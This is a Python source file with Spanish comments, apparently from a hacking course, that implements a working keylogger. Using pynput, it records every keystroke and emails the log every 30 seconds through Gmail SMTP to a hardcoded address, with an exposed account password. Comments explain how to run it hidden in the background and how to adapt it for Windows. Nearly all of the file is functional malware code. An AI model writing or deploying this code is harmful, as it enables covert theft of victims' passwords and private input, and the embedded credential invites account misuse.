'''
    Vamos a crear un keylogger que se ejecute en segundo plano y que guarde las teclas que se presionan en un archivo de texto.
    Para ello, vamos a utilizar la librería pynput.
'''
#!/usr/bin/env python3

import pynput.keyboard
from string import capwords
import signal
import sys
import threading # timers for sending email? 
import smtplib
from email.mime.text import MIMEText


class Keylogger:
    
    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.its_first_run = True
        
    def pressed_key(self, key):
        global log
        
        try:
            self.log+= str(key.char)
        except AttributeError:
            if key == key.space:
                self.log+= " "
            else:
                self.log+= " " + capwords(str(key)[4:]) + " "
    
    def send_mail(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = sender
        msg["To"] = ', '.join(recipients)
        
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(sender, password)
            server.sendmail(sender, recipients, msg.as_string())
        print(f"\n [i] Email enviado")

    def report(self):
        email_body = "[+] El Keylogger se ha iniciado exitosamente" if self.its_first_run else self.log
        self.send_mail("Keylogger Report", email_body, "jaimetesting.hack4u@gmail.com", ["jaimetesting.hack4u@gmail.com"], "qyzd gjrk nmwm abtw")
        self.log = ""
        if self.its_first_run:
            self.its_first_run = False
        if not self.request_shutdown:
            self.timer = threading.Timer(30, self.report) # Cada 10 segundos
            self.timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key) 

        with keyboard_listener: # Abrimos el listener
            self.report()
            keyboard_listener.join() # Mantenemos el listener abierto

    def shutdown(self):
        self.request_shutdown = True
        if self.timer:
            self.timer.cancel()
            
# Ejecutar python3 main.py &> /dev/null & para ejecutar en segundo plano

# para que valga en windows, hay que cambiar el send_mail por el siguiente:
# def send_mail(self, subject, body, sender, recipients, password):
#         msg = MIMEText(body)
#         msg["Subject"] = subject
#         msg["From"] = sender
#         msg["To"] = ', '.join(recipients)

#         with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
#             server.login(sender, password)
#             server.sendmail(sender, recipients, msg.as_string())
#         print(f"\n [i] Email enviado")

# para que funcione en una maquina que no tiene las librerias instaladas, hay que hacer lo siguiente:
# pip3 install pynput
# pip3 install termcolor

# para que funcione en windows, hay que hacer lo siguiente:
# pip install pynput
# pip install termcolor

